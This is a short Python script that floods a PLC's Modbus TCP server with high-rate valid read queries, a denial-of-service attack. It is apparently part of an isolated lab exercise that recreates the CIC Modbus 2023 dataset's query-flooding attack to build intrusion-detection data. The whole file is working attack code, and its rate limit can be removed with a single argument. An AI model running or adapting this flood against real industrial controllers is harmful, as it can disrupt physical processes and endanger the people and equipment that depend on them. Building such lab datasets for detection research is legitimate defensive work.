#!/usr/bin/env python3
"""
Modbus query flooding / DoS  (Task 3, Step 3c) -- "service overload".

Overwhelms the PLC's Modbus TCP server with a high rate of VALID Modbus queries
(application-layer flood), matching CIC Modbus 2023's "query flooding" method.

For ISOLATED lab use only (see SECURITY.md).

Usage (inside Kali):  python3 modbus_flood.py [host] [port] [duration_seconds] [rate_qps]
    default host=openplc  port=502  duration=20  rate=200 queries/sec

NOTE: the rate is capped (default ~200 q/s) so the flood stresses the PLC without
crashing its Modbus runtime outright. That is still ~200x the benign ~1 Hz poller,
so the flood signature is unmistakable, but the target stays up. Pass a 5th arg
(or 0 for unbounded) to change it.
"""
import sys, time
from pymodbus.client import ModbusTcpClient

HOST = sys.argv[1] if len(sys.argv) > 1 else "openplc"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 502
DUR  = float(sys.argv[3]) if len(sys.argv) > 3 else 20.0
RATE = float(sys.argv[4]) if len(sys.argv) > 4 else 200.0

c = ModbusTcpClient(HOST, port=PORT)
if not c.connect():
    print(f"[!] could not connect to {HOST}:{PORT}")
    sys.exit(1)

interval = 1.0 / RATE if RATE > 0 else 0.0
print(f"[*] Flooding {HOST}:{PORT} for {DUR:.0f}s at ~{RATE:.0f} q/s ...")
n = 0
t0 = time.time()
nxt = t0
while time.time() - t0 < DUR:
    c.read_holding_registers(0, count=10)   # a valid query
    n += 1
    if interval:
        nxt += interval
        slp = nxt - time.time()
        if slp > 0:
            time.sleep(slp)
c.close()

dt = time.time() - t0
print(f"[*] Sent {n} queries in {dt:.1f}s  =  {n/dt:.0f} queries/sec")
print("[*] Done -- query flood complete.")
